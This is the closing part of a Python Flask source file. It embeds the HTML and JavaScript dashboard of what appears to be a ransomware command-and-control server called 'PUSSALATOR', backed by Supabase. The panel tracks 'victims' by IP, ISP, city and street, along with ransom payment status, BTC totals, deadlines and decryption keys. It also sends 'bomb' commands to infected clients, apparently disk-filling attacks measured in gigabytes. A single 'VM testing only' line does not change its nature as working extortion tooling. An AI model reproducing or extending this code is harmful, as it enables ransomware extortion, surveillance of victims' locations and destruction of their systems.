                    <div class="stat-card"><div class="stat-value">${s.paid}</div><div class="stat-label">PAID</div></div>
                    <div class="stat-card"><div class="stat-value">${s.unpaid}</div><div class="stat-label">UNPAID</div></div>
                    <div class="stat-card"><div class="stat-value">${s.btc}</div><div class="stat-label">BTC</div></div>
                    <div class="stat-card"><div class="stat-value">${s.bombs}</div><div class="stat-label">BOMBS</div></div>
                `;
            } catch(e) {}
        }
        
        async function loadVictims() {
            try {
                const r = await fetch('/api/victims');
                const v = await r.json();
                let html = '';
                for (const [id, data] of Object.entries(v)) {
                    const deadline = new Date(data.deadline).toLocaleString();
                    const bombStatus = data.bomb_status === 'active' ? 
                        `<span class="status-active">ACTIVE ${data.bomb_size.toFixed(1)}GB</span>` : 
                        'inactive';
                    html += `<tr>
                        <td>${id}</td>
                        <td>${data.files}</td>
                        <td>${data.city || '?'}, ${data.country || '?'}</td>
                        <td>${data.ip}</td>
                        <td class="${data.status === 'paid' ? 'status-paid' : 'status-unpaid'}">${data.status}</td>
                        <td>${bombStatus}</td>
                        <td>${deadline}</td>
                        <td><button class="danger" onclick="quickDelete('${id}')">X</button></td>
                    </tr>`;
                }
                document.querySelector('#victims_table tbody').innerHTML = html || '<tr><td colspan="8">No victims found</td></tr>';
            } catch(e) {}
        }
        
        async function loadBombs() {
            try {
                const r = await fetch('/api/victims');
                const v = await r.json();
                let html = '';
                for (const [id, data] of Object.entries(v)) {
                    if (data.bomb_status === 'active') {
                        html += `<tr>
                            <td>${id}</td>
                            <td>${data.bomb_size.toFixed(2)} GB</td>
                            <td class="status-active">ACTIVE</td>
                            <td>${new Date(data.last_seen).toLocaleString()}</td>
                            <td><button class="danger" onclick="quickStop('${id}')">STOP</button></td>
                        </tr>`;
                    }
                }
                document.querySelector('#bombs_table tbody').innerHTML = html || '<tr><td colspan="5">No active bombs</td></tr>';
            } catch(e) {}
        }
        
        async function loadLogs() {
            try {
                const r = await fetch('/api/logs');
                const l = await r.json();
                let html = '';
                l.slice(-50).forEach(log => {
                    html += `<div>[${log.time.slice(11,19)}] ${log.level}: ${log.msg}</div>`;
                });
                document.getElementById('logs').innerHTML = html || 'No logs';
            } catch(e) {}
        }
        
        async function startBomb() {
            const client = document.getElementById('bomb_client').value;
            const file = document.getElementById('bomb_file').value;
            if (!client) return alert('Enter Client ID');
            
            try {
                const r = await fetch('/api/bomb/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({client_id: client, filename: file})
                });
                const d = await r.json();
                if (d.success) {
                    alert('Bomb command sent');
                    setTimeout(checkBomb, 2000);
                }
            } catch(e) {
                alert('Error sending command');
            }
        }
        
        async function stopBomb() {
            const client = document.getElementById('bomb_client').value;
            if (!client) return alert('Enter Client ID');
            
            try {
                const r = await fetch('/api/bomb/stop', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({client_id: client})
                });
                const d = await r.json();
                if (d.success) {
                    alert('Stop command sent');
                    document.getElementById('bomb_progress').style.display = 'none';
                    document.getElementById('bomb_status').innerHTML = '';
                }
            } catch(e) {
                alert('Error sending command');
            }
        }
        
        async function checkBomb() {
            const client = document.getElementById('bomb_client').value;
            if (!client) return;
            
            try {
                const r = await fetch(`/api/victim/${client}`);
                if (r.status === 200) {
                    const v = await r.json();
                    if (v.bomb_status === 'active') {
                        document.getElementById('bomb_status').innerHTML = 
                            `<div>Bomb ACTIVE - Size: ${v.bomb_size.toFixed(2)} GB</div>`;
                        document.getElementById('bomb_progress').style.display = 'block';
                        document.getElementById('bomb_fill').style.width = `${Math.min(v.bomb_size, 100)}%`;
                    } else {
                        document.getElementById('bomb_status').innerHTML = 'No active bomb';
                        document.getElementById('bomb_progress').style.display = 'none';
                    }
                }
            } catch(e) {}
        }
        
        async function quickStop(clientId) {
            try {
                const r = await fetch('/api/bomb/stop', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({client_id: clientId})
                });
                if (r.ok) {
                    loadBombs();
                    loadVictims();
                }
            } catch(e) {}
        }
        
        async function getVictim() {
            const id = document.getElementById('victim_id').value;
            if (!id) return;
            
            try {
                const r = await fetch(`/api/victim/${id}`);
                if (r.status === 200) {
                    const v = await r.json();
                    document.getElementById('victim_info').innerHTML = `
                        <b>ID:</b> ${v.id}<br>
                        <b>Files:</b> ${v.files}<br>
                        <b>Location:</b> ${v.street ? v.street + ', ' : ''}${v.city}, ${v.country}<br>
                        <b>IP:</b> ${v.ip}<br>
                        <b>ISP:</b> ${v.isp}<br>
                        <b>Status:</b> <span class="${v.status === 'paid' ? 'status-paid' : 'status-unpaid'}">${v.status}</span><br>
                        <b>Bomb:</b> ${v.bomb_status} ${v.bomb_size > 0 ? '(' + v.bomb_size.toFixed(2) + ' GB)' : ''}<br>
                        <b>Deadline:</b> ${new Date(v.deadline).toLocaleString()}<br>
                        ${v.status === 'paid' ? '<b>Key:</b> ' + v.key : ''}
                    `;
                } else {
                    document.getElementById('victim_info').innerHTML = 'Victim not found';
                }
            } catch(e) {
                document.getElementById('victim_info').innerHTML = 'Error loading victim';
            }
        }
        
        async function deleteVictim() {
            const id = document.getElementById('victim_id').value;
            if (!id) return;
            if (confirm('Delete ' + id + '?')) {
                try {
                    await fetch(`/api/victim/${id}`, {method: 'DELETE'});
                    loadVictims();
                    loadBombs();
                    document.getElementById('victim_info').innerHTML = 'Victim deleted';
                } catch(e) {}
            }
        }
        
        async function quickDelete(id) {
            if (confirm('Delete ' + id + '?')) {
                try {
                    await fetch(`/api/victim/${id}`, {method: 'DELETE'});
                    loadVictims();
                    loadBombs();
                } catch(e) {}
            }
        }
        
        function logout() {
            window.location.href = '/';
        }
        
        function updateTime() {
            document.getElementById('timestamp').innerText = new Date().toLocaleString();
        }
        
        function startUpdates() {
            loadStats();
            loadVictims();
            loadBombs();
            loadLogs();
            updateTime();
            
            if (updateInterval) clearInterval(updateInterval);
            updateInterval = setInterval(() => {
                loadStats();
                loadVictims();
                loadBombs();
                loadLogs();
                updateTime();
            }, 10000);
        }
        
        startUpdates();
    </script>
</body>
</html>
"""

# ============================================================================
# MAIN
# ============================================================================

if __name__ == '__main__':
    print("=" * 60)
    print("PUSSALATOR - SUPABASE BACKEND")
    print("=" * 60)
    print(f"Supabase URL: {Config.SUPABASE_URL}")
    print(f"Server: http://{Config.HOST}:{Config.PORT}")
    print(f"Owner ID: {Config.OWNER_ID}")
    print(f"Debug mode: {Config.DEBUG}")
    print("=" * 60)
    print("WARNING: For VM testing only!")
    print("=" * 60)
    
    # Test Supabase connection
    try:
        test = supabase_admin.table('victims').select('count', count='exact').limit(1).execute()
        print("[+] Supabase connection successful")
    except Exception as e:
        print(f"[-] Supabase connection failed: {e}")
        print("Check your SUPABASE_URL and SUPABASE_KEY")
        sys.exit(1)
    
    app.run(
        host=Config.HOST,
        port=Config.PORT,
        debug=Config.DEBUG
    )
